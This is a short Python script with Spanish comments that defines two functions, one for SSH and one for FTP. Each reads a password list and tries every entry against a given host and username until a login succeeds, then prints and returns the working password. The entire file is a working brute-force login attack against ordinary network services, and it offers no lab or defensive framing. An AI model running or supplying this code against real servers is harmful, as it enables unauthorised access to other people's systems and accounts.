import paramiko, ftplib, time;

def ssh_attack(ip, port, username, password_list_path):

    #Abrimos el archivo con permisos de red y separamos por saltos en linea
    with open(password_list_path, "r") as password_file:
        #Igualamos la variable password_list al archivo en modo lectura y separado por saltos en linea 
        password_list = password_file.read().split("\n")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            print(f"Vamos a intentar con: {password}") 
            ssh.connect(ip, port=port, username=username, password=password)
            print(f"Conexión exitosa. Contraseña: {password} Usuario: {username}")
            time.sleep(8)
            return password
        except Exception as e:
            print(f"Ha sucedido un error: {e}")
        
    print("No se pudo encontrar una contraseña válida.")

    # Cerrar la conexión después de intentar todas las contraseñas
    ssh.close()



def ftp_attack(ip, usuario, password_list_path):
    with open(password_list_path, "r") as password_file:
        password_list = password_file.read().split("\n")

    ftp = ftplib.FTP(ip)

    for password in password_list:
        try:
            print(f"Vamos a intentar con: {password}")
            ftp = ftplib.FTP(ip)
            
            ftp.login(usuario, password)
            ftp.quit()
            print(f"Conexion exitosa! Usuario: {usuario} Contraseña: {password}")
            return password
        except Exception as e:
            print(f"Ha sucedido un error: {e}")
            ftp.quit()
             
    print("No se encontro la contraseña")
    ftp.close()























